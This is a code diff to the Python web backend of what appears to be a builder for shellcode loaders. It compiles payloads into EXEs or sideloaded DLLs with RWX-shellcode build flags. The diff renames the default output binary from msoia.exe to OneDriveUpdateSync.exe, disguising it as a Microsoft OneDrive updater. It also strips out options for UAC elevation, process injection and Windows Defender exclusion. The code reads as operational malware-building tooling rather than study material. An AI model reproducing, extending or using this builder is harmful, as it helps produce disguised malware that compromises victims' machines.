@@ -275,7 +275,7 @@ def _save_build_history(
     sideload_h_size: byte size of Sideload.h already copied to hist_dir (0 if absent).
     """
     ok          = (returncode == 0)
-    binary_name = (output_arg if output_arg else "msoia.exe") if mode == "exe" else (output_arg if output_arg else "sideload.dll")
+    binary_name = (output_arg if output_arg else "OneDriveUpdateSync.exe") if mode == "exe" else (output_arg if output_arg else "sideload.dll")
 
     hist_dir = BUILD_HISTORY_DIR / job_id
     hist_dir.mkdir(parents=True, exist_ok=True)
@@ -287,11 +287,8 @@ def _save_build_history(
         "mode":           mode,
         "binary_name":    binary_name,
         "binary_size":    0,
-        "uac":            bool(data.get("uac")),
         "rwx":            bool(data.get("rwx")),
         "debug":          bool(data.get("debug")),
-        "inject":         bool(data.get("inject")) and mode == "sideload",
-        "wd_excl":        bool(data.get("wd_excl")) and bool(data.get("uac")),
         "zip_name":       zip_info.get("name") if zip_info else None,
         "zip_size":       zip_info.get("size", 0) if zip_info else 0,
         "sideload_h_size": sideload_h_size,
@@ -635,11 +632,8 @@ def api_build():
     mode  = data.get("mode", "exe")
     if mode not in VALID_MODES:
         return jsonify({"ok": False, "stderr": f"invalid mode: {mode}"}), 400
-    uac     = bool(data.get("uac"))
     rwx     = bool(data.get("rwx"))
     debug   = bool(data.get("debug"))
-    inject  = bool(data.get("inject")) and mode == "sideload"
-    wd_excl = bool(data.get("wd_excl")) and uac
 
     # ── Payload.h: copy from encrypt history if requested ────────────────
     enc_hist_id = (data.get("encrypt_history_id") or "").strip()
@@ -716,8 +710,6 @@ def api_build():
     extras: list[str] = []
     if rwx:      extras.append("/DRWX_SHELLCODE")
     if debug:    extras.append("/DDEBUG")
-    if inject:   extras.append("/DENABLE_INJECT")
-    if wd_excl:  extras.append("/DENABLE_WD_EXCL")
     if extras:
         env["CFLAGS_EXTRA"] = " ".join(extras)
 
@@ -737,14 +729,11 @@ def api_build():
                 if sg_safe:
                     sg_argv += ["--rename", sg_safe]
         else:
-            effective_output = exe_output_name or "msoia.exe"
+            effective_output = exe_output_name or "OneDriveUpdateSync.exe"
             build_args = ["build.bat"]
             sg_argv = None
             if exe_output_name:
                 env["OUTNAME"] = exe_output_name
-
-        if uac:
-            build_args.append("uac")
 
         # Header
         header = ""
@@ -924,7 +913,7 @@ def api_build_history_download(jid, ftype):
         mf = job_dir / "meta.json"
         if not mf.is_file():
             return "not found", 404
-        binary_name = json.loads(mf.read_text()).get("binary_name", "msoia.exe")
+        binary_name = json.loads(mf.read_text()).get("binary_name", "OneDriveUpdateSync.exe")
         safe = _safe_name(binary_name)
         if not safe:
             return "invalid", 400
@@ -1008,11 +997,8 @@ def api_profiles_build_create():
         "bind_id":             data.get("bind_id", ""),
         "bind_rename":         data.get("bind_rename", ""),
         "mode":                data.get("mode", "exe"),
-        "uac":                 bool(data.get("uac")),
         "rwx":                 bool(data.get("rwx")),
         "debug":               bool(data.get("debug")),
-        "inject":              bool(data.get("inject")),
-        "wd_excl":             bool(data.get("wd_excl")),
         "created_at":          int(time.time()),
     }
     profiles = _load_profiles()
@@ -1049,11 +1035,8 @@ def api_profiles_update(pid):
             "bind_id":            data.get("bind_id",         existing.get("bind_id", "")),
             "bind_rename":        data.get("bind_rename",     existing.get("bind_rename", "")),
             "mode":               data.get("mode",            existing.get("mode", "exe")),
-            "uac":                bool(data.get("uac")),
             "rwx":                bool(data.get("rwx")),
             "debug":              bool(data.get("debug")),
-            "inject":             bool(data.get("inject")),
-            "wd_excl":            bool(data.get("wd_excl")),
         })
     existing.update(update)
     profiles[idx] = existing
@@ -1738,10 +1721,8 @@ def _run_pool_build_locked(pool: dict) -> bool:
             shutil.copy2(str(ph_src), str(PROJECT_ROOT / "Payload.h"))
 
     mode            = profile.get("mode", "exe")
-    uac             = bool(profile.get("uac"))
     rwx             = bool(profile.get("rwx"))
     debug           = bool(profile.get("debug"))
-    inject          = bool(profile.get("inject")) and mode == "sideload"
     dll_id          = (profile.get("dll_id")          or "").strip()
     exe_id          = (profile.get("exe_id")          or "").strip()
     sideload_rename = (profile.get("sideload_rename") or "").strip()
@@ -1753,7 +1734,6 @@ def _run_pool_build_locked(pool: dict) -> bool:
     extras: list[str] = []
     if rwx:    extras.append("/DRWX_SHELLCODE")
     if debug:  extras.append("/DDEBUG")
-    if inject: extras.append("/DENABLE_INJECT")
     env = os.environ.copy()
     if extras:
         env["CFLAGS_EXTRA"] = " ".join(extras)
@@ -1782,8 +1762,6 @@ def _run_pool_build_locked(pool: dict) -> bool:
             return False
 
         build_args = ["build.bat", "sideload", dll_name]
-        if uac:
-            build_args.append("uac")
         try:
             proc = subprocess.run(build_args, cwd=str(PROJECT_ROOT), env=env,
                                   capture_output=True, text=True, timeout=180, shell=True)
@@ -1823,8 +1801,6 @@ def _run_pool_build_locked(pool: dict) -> bool:
 
     else:  # exe
         build_args = ["build.bat"]
-        if uac:
-            build_args.append("uac")
         try:
             proc = subprocess.run(build_args, cwd=str(PROJECT_ROOT), env=env,
                                   capture_output=True, text=True, timeout=180, shell=True)
@@ -1834,7 +1810,7 @@ def _run_pool_build_locked(pool: dict) -> bool:
         if proc.returncode != 0:
             _cleanup_build_artifacts()
             return False
-        binary_name = "msoia.exe"
+        binary_name = "OneDriveUpdateSync.exe"
         binary_src  = PROJECT_ROOT / binary_name
         if not binary_src.is_file():
             _cleanup_build_artifacts()
